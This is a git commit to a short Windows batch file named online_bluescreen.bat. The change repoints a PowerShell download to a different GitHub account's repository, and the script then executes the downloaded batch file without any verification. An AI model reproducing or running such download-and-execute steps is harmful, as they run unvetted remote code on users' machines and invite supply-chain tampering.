39f376610f15d6f78b010d1d303d64d229b65008
Bluescreen <148587892+harryaldwithjarryald@users.noreply.github.com>
2024-03-25 10:24:52 -0700

    Update online_bluescreen.bat

--- online_bluescreen.bat
+++ online_bluescreen.bat
@@ -1,3 +1,3 @@
 %echo off
-powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/online_temp.bat -OutFile online_temp.bat
+powershell /c Invoke-WebRequest https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/online_temp.bat -OutFile online_temp.bat
 online_temp.bat
